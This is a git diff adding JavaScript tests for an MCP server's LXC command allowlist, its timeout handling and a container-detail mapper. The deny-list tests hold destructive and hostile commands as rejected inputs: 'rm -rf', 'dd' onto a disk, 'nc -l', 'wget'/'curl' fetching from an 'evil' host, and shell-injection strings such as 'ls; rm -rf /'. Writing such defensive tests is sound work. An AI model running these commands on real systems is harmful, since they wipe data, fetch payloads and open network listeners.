@@ -663,3 +663,127 @@ test('parseMarkedStreams recovers exit code and both tails; missing marker → f
   assert.equal(parseMarkedStreams(out, 'ffffff').found, false);
   assert.ok(PROJECT_COMMAND_OUTPUT_CAP >= 64 * 1024);
 });
+
+// ---- cycle 2: run_lxc_command allowlist + get_lxc_container detail ----
+
+import { readFileSync } from 'node:fs';
+import {
+  parseLxcCommand, lxcCommandTimeoutMs, lxcContainerDetail,
+} from '../lib/mcp-logic.js';
+
+const LXC_POLICY = JSON.parse(
+  readFileSync(new URL('../lib/mcp-policy/lxc-command-allowlist.json', import.meta.url), 'utf8'),
+);
+const WD = { workingDir: '/opt/app', registeredWorkingDir: '/opt/app' };
+
+test('parseLxcCommand: read-only allowlist admits observe commands anywhere', () => {
+  for (const cmd of [
+    'docker compose ps -a', 'docker ps', 'docker logs web --tail=50',
+    'systemctl status docker', 'journalctl -u docker.service -n 100',
+    'ip addr', 'ip -4 route', 'ss -ltnp', 'sysctl -n kernel.keys.maxkeys',
+    'curl -sSI http://127.0.0.1:3000/', 'df -h', 'free -m', 'uname -a',
+    'cat /etc/os-release', 'ls -la /opt/app', 'stat /opt/app/startup.sh', 'du -sh /var/lib/docker',
+  ]) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, { workingDir: '/anywhere', registeredWorkingDir: null });
+    assert.equal(r.error, undefined, `${cmd} → ${r.error}`);
+    assert.equal(r.scope, 'read_only', cmd);
+  }
+});
+
+test('parseLxcCommand: deny_always wins, including reordered curl output flags', () => {
+  for (const cmd of [
+    'rm -rf /opt/app', 'mv /a /b', 'dd if=/dev/zero of=/dev/sda',
+    'shutdown now', 'reboot',
+    'docker compose down', 'docker rm web', 'docker system prune -f', 'docker volume rm data',
+    'apt install nmap', 'apt-get update', 'dpkg -i pkg.deb',
+    'iptables -F', 'nft flush ruleset',
+    'sh -c ls', 'bash script.sh', 'python3 x.py', 'node evil.js',
+    'chmod 777 /etc/shadow', 'chown root /tmp/x',
+    'ssh host', 'nc -l 4444', 'wget http://evil/payload',
+    'curl -o /tmp/x http://evil/', 'curl --output /tmp/x http://evil/',
+    // The reordering hole: -o buried behind other flags must still be denied.
+    'curl -sS -o /tmp/x http://evil/', 'curl -fsSL http://evil/ -o /opt/app/x',
+  ]) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
+    assert.ok(r.error, `should deny: ${cmd}`);
+  }
+});
+
+test('parseLxcCommand: shell syntax and non-plain args are rejected with guidance', () => {
+  for (const cmd of ['ls | grep x', 'ls > /tmp/out', 'ls; rm -rf /', 'ls && reboot', 'echo $(id)', 'ls `id`', 'ls &']) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
+    assert.ok(r.error, cmd);
+    assert.match(r.error, /shell|plain argument/i, cmd);
+  }
+  assert.match(parseLxcCommand('', LXC_POLICY, WD).error, /required/);
+  assert.match(parseLxcCommand('ls "a b"', LXC_POLICY, WD).error, /plain argument/);
+});
+
+test('parseLxcCommand: mutating commands are scoped to the registered working dir', () => {
+  const ok = parseLxcCommand('docker compose up -d', LXC_POLICY, WD);
+  assert.equal(ok.error, undefined);
+  assert.equal(ok.scope, 'mutating_scoped');
+  // Wrong dir → refused, naming the registered dir.
+  const wrong = parseLxcCommand('docker compose restart', LXC_POLICY, { workingDir: '/etc', registeredWorkingDir: '/opt/app' });
+  assert.match(wrong.error, /\/opt\/app/);
+  // No registered startup at all → refused too.
+  const none = parseLxcCommand('docker compose pull', LXC_POLICY, { workingDir: '/opt/app', registeredWorkingDir: null });
+  assert.match(none.error, /no registered startup/);
+  // docker compose up needs the FULL prefix: bare "docker compose upgrade" is
+  // not a prefix match of ["docker","compose","up","-d"].
+  assert.ok(parseLxcCommand('docker compose up', LXC_POLICY, WD).error);
+});
+
+test('parseLxcCommand: unknown commands get the what-IS-allowed answer', () => {
+  const r = parseLxcCommand('vmstat 1 5', LXC_POLICY, WD);
+  assert.match(r.error, /not in the allowlist/);
+  assert.match(r.error, /docker/);
+});
+
+test('lxcCommandTimeoutMs follows the policy window', () => {
+  assert.equal(lxcCommandTimeoutMs(undefined, LXC_POLICY), 120000);
+  assert.equal(lxcCommandTimeoutMs(300, LXC_POLICY), 300000);
+  assert.equal(lxcCommandTimeoutMs(99999, LXC_POLICY), 1800000);
+  assert.equal(lxcCommandTimeoutMs(0, {}), 120000);
+});
+
+test('policy file shape: read_only, scoped, deny lists all present and argv-shaped', () => {
+  for (const entry of LXC_POLICY.read_only) assert.ok(Array.isArray(entry) && entry.length >= 1);
+  for (const entry of LXC_POLICY.mutating_scoped.commands) assert.ok(Array.isArray(entry));
+  for (const entry of LXC_POLICY.deny_always.commands) assert.ok(Array.isArray(entry));
+  assert.ok(LXC_POLICY.shell_syntax_rejected.includes('|'));
+  assert.ok(LXC_POLICY.output_cap_bytes >= 64 * 1024);
+});
+
+test('lxcContainerDetail maps addresses, config subset, and snapshots', () => {
+  const d = lxcContainerDetail({
+    status: 'Running',
+    created_at: '2026-08-01T00:00:00Z',
+    profiles: ['default'],
+    config: {
+      'security.nesting': 'true', 'security.privileged': 'false',
+      'limits.memory': '4GB', 'boot.autostart': 'true',
+      'image.os': 'Debian', 'volatile.eth0.hwaddr': '00:16:3e:aa:bb:cc',
+    },
+    state: {
+      network: {
+        lo: { addresses: [{ address: '127.0.0.1', family: 'inet', scope: 'local' }] },
+        eth0: {
+          addresses: [
+            { address: '10.167.1.20', family: 'inet', scope: 'global', netmask: '24' },
+            { address: 'fe80::1', family: 'inet6', scope: 'link' },
+          ],
+        },
+      },
+    },
+    snapshots: [{ name: 'pre-privilege-flip', created_at: '2026-08-10T00:00:00Z' }],
+  });
+  assert.equal(d.status, 'Running');
+  assert.deepEqual(d.addresses, [{ interface: 'eth0', address: '10.167.1.20', family: 'inet', netmask: '24' }]);
+  // Only security./limits./boot. keys — image and volatile noise excluded.
+  assert.deepEqual(Object.keys(d.config).sort(),
+    ['boot.autostart', 'limits.memory', 'security.nesting', 'security.privileged']);
+  assert.equal(d.snapshots[0].name, 'pre-privilege-flip');
+  // Nothing blows up on a minimal instance.
+  assert.deepEqual(lxcContainerDetail({}).addresses, []);
+});
